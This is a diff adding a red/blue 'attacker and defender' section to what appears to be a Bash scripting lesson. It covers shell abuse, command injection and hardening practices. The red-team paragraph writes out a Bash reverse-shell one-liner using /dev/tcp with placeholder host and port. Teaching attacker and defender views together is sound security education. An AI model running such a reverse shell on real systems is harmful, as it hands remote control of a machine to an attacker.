@@ -399,6 +399,16 @@ re-tests leaked-secret ordering).
 
 ---
 
+## Lens E — Attacker & Defender (Red / Blue)
+
+> Red/Blue framing (Gate Rule **Lens E**, D14). Build *both* mindsets: know how the
+> tools in this lesson are abused, and how a defender detects and stops them.
+> Frameworks: [GTFOBins](https://gtfobins.github.io/) · [MITRE ATT&CK](https://attack.mitre.org/) · [LOLBAS](https://lolbas-project.github.io/).
+
+**🔴 Attacker (how it's abused — Step 2):** Bash is the #1 post-exploitation shell: reverse shells (`bash -i >& /dev/tcp/<ip>/<port> 0>&1`), LOLBin one-liners, and obfuscated payloads. Insecure scripts add command injection via unquoted variables, `eval`, or world-writable scripts run by root/cron. ATT&CK **T1059.004** (Unix Shell).
+
+**🔵 Defender (detect & harden — Step 5):** Write defensively: `set -euo pipefail`, **quote every variable**, validate input, avoid `eval`, give scripts least-privilege ownership/perms, log actions, and hunt `/dev/tcp` or odd outbound connections in history and network logs.
+
 ## Step 8 — Search Keywords For Further Understanding
 
 **Core**
@@ -418,6 +428,10 @@ re-tests leaked-secret ordering).
 - `ansible vs bash when to use which`
 
 ---
+
+**Red / Blue (Lens E — study attacker & defender in parallel):**
+- 🔴 **Red (attacker):** `bash reverse shell /dev/tcp`, `MITRE ATT&CK T1059.004 unix shell`, `command injection bash unquoted variable`, `LOLBins linux`
+- 🔵 **Blue (defender):** `bash set -euo pipefail security`, `shellcheck static analysis`, `detect reverse shell linux`, `secure bash scripting practices`
 
 ## Lesson Status
 
